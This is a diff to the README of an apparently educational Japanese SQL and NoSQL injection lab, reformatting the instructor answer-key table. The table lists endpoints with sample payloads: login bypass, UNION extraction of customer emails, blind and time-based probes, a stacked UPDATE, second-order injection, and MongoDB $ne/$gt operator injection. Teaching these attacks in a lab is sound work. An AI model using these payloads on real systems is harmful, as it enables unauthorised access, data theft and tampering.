@@ -28,15 +28,15 @@ docker compose up --build
 
 ## 講師向け答え合わせ
 
-| 場所 | 代表的な脆弱性 | 確認例 |
-|---|---|---|
-| `/login` | SQLiログインバイパス | `admin' -- ` |
-| `/catalog?q=` | UNION情報漏洩 | `zzz%' UNION SELECT id,email,last_order_total FROM challenge_customers -- ` |
-| `/track?order_id=` | Boolean/Time-based blind SQLi | `1001 AND 1=1` / `1001 AND SLEEP(3)` |
-| `/notes` | Stacked queries | `x'); UPDATE challenge_notes SET text='CHANGED' WHERE id=1; -- ` |
-| `/register` → `/admin/report` | Second-order SQLi | `nobody' OR '1'='1' -- ` を登録後、レポートを開く |
-| `/api/login` | NoSQL injection | `{"username":{"$ne":null},"password":{"$ne":null}}` |
-| `/api/customers?filter=` | NoSQL条件注入 | `{"total":{"$gt":0}}` |
+| 場所                          | 代表的な脆弱性                | 確認例                                                                      |
+| ----------------------------- | ----------------------------- | --------------------------------------------------------------------------- |
+| `/login`                      | SQLiログインバイパス          | `admin' -- `                                                                |
+| `/catalog?q=`                 | UNION情報漏洩                 | `zzz%' UNION SELECT id,email,last_order_total FROM challenge_customers -- ` |
+| `/track?order_id=`            | Boolean/Time-based blind SQLi | `1001 AND 1=1` / `1001 AND SLEEP(3)`                                        |
+| `/notes`                      | Stacked queries               | `x'); UPDATE challenge_notes SET text='CHANGED' WHERE id=1; -- `            |
+| `/register` → `/admin/report` | Second-order SQLi             | `nobody' OR '1'='1' -- ` を登録後、レポートを開く                           |
+| `/api/login`                  | NoSQL injection               | `{"username":{"$ne":null},"password":{"$ne":null}}`                         |
+| `/api/customers?filter=`      | NoSQL条件注入                 | `{"total":{"$gt":0}}`                                                       |
 
 ## 講義での進め方
 
